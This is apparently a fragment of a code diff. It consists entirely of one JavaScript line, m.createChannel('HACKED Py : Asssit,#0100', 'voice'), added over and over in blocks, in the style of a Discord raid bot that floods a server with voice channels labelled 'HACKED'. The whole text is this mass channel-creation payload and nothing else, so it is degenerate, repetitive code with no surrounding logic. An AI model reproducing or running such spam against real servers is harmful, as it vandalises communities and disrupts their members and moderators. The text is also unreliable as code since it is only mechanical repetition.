+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
